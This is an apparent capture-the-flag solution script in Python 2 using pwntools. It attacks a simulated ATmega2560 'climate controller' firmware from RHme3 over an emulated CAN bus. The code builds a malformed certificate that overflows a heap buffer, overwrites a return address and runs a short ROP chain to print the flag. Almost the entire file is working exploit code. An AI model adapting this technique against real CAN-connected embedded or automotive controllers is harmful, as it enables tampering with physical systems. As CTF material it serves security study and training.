#!/usr/bin/python2

from pwn import *


def attack(connection, can):
    def sim_run():
        can.send(p8(0))

    def sim_run_few():
        for _ in xrange(1):
            sim_run()
            connection.recvuntil("MAIN_LOOP")

    def can_send_frame(ctrl, sid, eid, data):
        sim_run_few()
        can.send(p8(1))
        frame = struct.pack("<BHBB8s", ctrl, sid, eid, len(data), data)
        can.send(frame)

    def build_certificate(rop, point_x, point_y):
        message_size = 0x40

        buffer = StringIO()

        buffer.write(p8(0x30))
        buffer.write(p8(message_size - 2))
        buffer.write("A")
        buffer.write(p8(message_size - 5))
        buffer.write("B" * 2)
        buffer.write(rop)
        padding = message_size - buffer.tell()
        buffer.write("C" * padding)
        buffer.write(p8(1))
        buffer.write("D" * 2)
        buffer.write(p8(1))
        buffer.write("E" * 2)
        buffer.write(p8(0x31))
        buffer.write(p8(4))
        buffer.write(pack(point_x, word_size = 0x18 << 3, endianness = "little"))
        buffer.write(pack(point_y, word_size = 0x18 << 3, endianness = "little"))
        padding = 0x271 - buffer.tell()
        buffer.write("F" * padding)
        padding = - buffer.tell()
        padding %= 7
        buffer.write("G" * padding)

        content_size = buffer.tell()

        # overwrite message_size for sub_66c5
        buffer.write("H" * 4)
        buffer.write(p16(message_size, endianness = "little"))

        data = buffer.getvalue()

        return content_size, data

    def app_send_0776_certificate():
        buffer = StringIO()
        buffer.write(pack(0x4c4a, word_size = 0x18, endianness = "big"))
        buffer.write(p16(0x1337, endianness = "big"))
        buffer.write(pack(0x8d91, word_size = 0x18, endianness = "big"))
        buffer.write(p16(0x210a - 1, endianness = "big"))
        buffer.write("I" * 2)
        buffer.write(pack(0x4c46, word_size = 0x18, endianness = "big"))
        buffer.write("J" * 4)
        buffer.write(pack(0x4e8f, word_size = 0x18, endianness = "big"))

        certificate_content_size, certificate_data = build_certificate(
            # overwrite ret address with 002720
            point_x = 0xffffffffffffffffffffffffffffffffffffffffff5ab893,
            point_y = 1,
            rop = buffer.getvalue(),
        )

        # (1) Initilize single byte that will follow certificate_data in rx queue.
        #     The byte will be interpreted as type of message consumed when we execute sub_2720 via exploit.

        queue_content_size = len(certificate_data) + 7
        queue_data = "I" * queue_content_size

        reader = StringIO(queue_data)
        chunk = reader.read(6)
        can_send_frame(0, 0, 0, p8(0x10 | (queue_content_size >> 8)) + p8(queue_content_size & 0xff) + chunk)
        sequence = 0
        chunk = reader.read(7)
        while chunk != b"":
            sequence += 1
            sequence &= 0x0f
            if reader.tell() == queue_content_size:
                can_send_frame(0, 0, 0, p8(0x10) + chunk)
            else:
                can_send_frame(0, 0, 0, p8(0x20 | sequence) + chunk)
            chunk = reader.read(7)

        # (2) Overwrite ret address from bigint_mul_u via overlapping heap buffer.

        reader = StringIO(certificate_data)
        chunk = reader.read(6)
        can_send_frame(0, 0x0776, 0, p8(0x10 | (certificate_content_size >> 8)) + p8(certificate_content_size & 0xff) + chunk)
        sequence = 0
        chunk = reader.read(7)
        while chunk != b"":
            sequence += 1
            sequence &= 0x0f
            can_send_frame(0, 0, 0, p8(0x20 | sequence) + chunk)
            chunk = reader.read(7)

    app_send_0776_certificate() 
    context.log_level = "debug"
    sim_run()
    connection.recvuntil("It's dangerous to go alone! take this.")
    flag = connection.recvn(0x20)
    info("flag = %s", flag)


can_local, can_remote = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
with process(["/mnt/rhme3/dev/simavr/simavr/run_avr", "-m", "atmega2560", "-f", "1000000", "climate_controller.hex"], env = {"P4_CAN_FD": str(can_remote.fileno())}, close_fds = False) as uart:
    attack(uart, can_local)
